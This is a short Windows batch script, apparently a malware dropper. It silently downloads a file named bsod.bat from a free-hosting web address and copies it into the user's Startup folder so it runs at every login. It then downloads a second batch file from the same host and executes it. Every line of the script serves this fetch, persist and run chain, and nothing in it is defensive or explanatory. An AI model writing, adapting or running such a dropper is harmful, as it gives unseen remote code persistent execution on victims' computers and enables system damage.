@echo off

curl.exe https://h19qjj92.000webhostapp.com/code.html --silent -o bsod.bat

timeout 1

copy "bsod.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

timeout 1

curl.exe https://h19qjj92.000webhostapp.com/code3.html --silent -o code.bat

timeout 1

start code.bat
